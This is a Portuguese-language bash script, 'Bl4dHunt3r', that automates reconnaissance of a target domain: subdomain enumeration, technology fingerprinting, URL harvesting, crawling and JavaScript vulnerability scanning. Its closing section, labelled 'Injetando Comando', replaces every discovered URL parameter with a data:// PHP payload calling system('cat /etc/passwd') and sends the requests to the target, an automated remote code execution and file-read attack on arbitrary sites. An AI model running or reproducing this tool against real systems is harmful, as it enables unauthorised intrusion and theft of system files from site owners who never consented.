############# Creditos: Bl4dSc4n - Livre uso e modificação ######################
#!/bin/bash
profundidade=/home/bl4dsc4n/profundidade.py
echo "Digite o dominio"
read dominio
mkdir $dominio
cd $dominio
echo "#####    Bl4dHunt3r  v. 0.0.1 ###"  
echo "#################################"
echo "Procurando Dominios e Subdominios"
echo "#################################"
findomain -q -t $dominio -i | tee -a IP-$dominio 
awk '{print $1}' IP-$dominio > dominios;echo $dominio >> dominios
subfinder -dL dominios -silent | tee -a sub-$dominio > sub3-$dominio; cat dominios >> sub3-$dominio; cat sub3-$dominio | sort -u > sub4-$dominio
rm -rf sub-$dominio dominios sub3-$dominio
cat sub4-$dominio | httpx -random-agent -silent | tee -a sub2-$dominio
echo "Procurando Tecnologias usadas"
for r in $(cat sub2-$dominio);do wappy -u $r;done | tee -a Tecnologias-$dominio 
echo "Procurando Links"
cat sub2-$dominio | gauplus --random-agent -subs -t 25 | tee -a links-$dominio 
echo "Extraindo os Heads"
for i in $(cat sub2-$dominio);do curl -X OPTIONS $i -I -s -H "user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0";done | tee -a HTTP-HEADS.TXT
echo "Crawl de Profundidade"
for t in $(cat sub2-$dominio);do  python3 $profundidade $t 2>/dev/null | awk '{print $3}';done | tee -a crawl.txt
cat crawl.txt >> links-$dominio
cat links-$dominio | sort -u > links2-$dominio
rm -rf links-$dominio
echo "Verificando status dos links"
for e in $(cat links2-$dominio);do curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk $e;done | tee -a code_achados.txt
echo "Localizando Json"
cat code_achados.txt | grep "200" | awk '/\.js|\.json/ {print $3}' | tee -a json_files
echo "Localizando Parametros"
cat code_achados.txt | egrep "200|403|500" | grep -v "\.ttf|\.woff|\.svg|\.gif|\.woff2|.\ico|.eot" | awk '/=/ {print $3}' | tee -a parametros_files
echo "Localizados links ativos"
cat code_achados.txt | egrep "200|403|500" |  awk '/=/ {print $3}' | tee -a todos_files
echo "Baixandos arquivos json"
for f in $(cat json_files);do wget $f -q 2>/dev/null;done 
fdupes -N -d . 1>/dev/null
echo "Analisando Arquivos Json"
retire -j --colors | tee -a vulnerabilidades2-js 
echo "Injetando Comando"
cat parametros_files | qsreplace "data://text/plan,%3c?php%20system('cat%20/etc/passwd')%20?%3e" > injetando.txt
for a in $(cat injetando.txt); do curl -s -q -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" $a;done | grep -v "<"  
echo "Fim do Recon"
